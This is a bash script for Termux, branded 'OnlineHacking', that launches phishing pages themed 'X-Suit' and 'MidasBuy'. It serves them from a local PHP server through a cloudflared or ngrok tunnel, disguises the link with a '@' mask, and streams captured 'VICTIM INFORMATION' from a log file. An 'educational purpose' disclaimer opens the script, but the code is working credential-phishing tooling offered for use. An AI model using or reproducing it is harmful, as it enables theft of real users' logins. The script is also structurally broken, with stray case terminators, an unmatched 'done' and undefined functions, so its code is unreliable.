#!/bin/bash
clear
echo ""
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m OnlineHacking :\e[1;32m Join Telegram Channel \e[1;33m @OnlineHacking  !\e[0m"
sleep 4
echo ""
clear
echo ""
printf "\e[31m[\e[32m★\e[31m]\e[32m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Accepted This Notice \e[1;91m (Y/N) : \e[0m' option
echo""
echo""
echo""
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm


## Start Cloudflared
start_cloudflared() { 
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}





if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
cd /data/data/com.termux/files/usr/bin/OnlineHacking/
bash Logo.sh
bash Logo2.sh
echo ""
echo ""
                 echo -e $''   
                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
                 echo ""
		 if [ $option = 01 ] || [ $option = 1 ]
                 then 
                           cd /data/data/com.termux/files/usr/bin/SUMAN
                           cd X-Suit/
			   echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
                           start_cloudflared;;
			   echo ""
			   
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt

	          break;
		  
                  elif [ $option = 02 ] || [ $option = 2 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/SUMAN/
                           cd MidasBuy/         
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt


                  break;
                  	  

                elif [ $option = 99 ]
	        then     
	                 echo
       	                 exit 
		break;
		      
                else 
		  
		         echo
		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
		         sleep 2
                         exit
		         fi
                         done
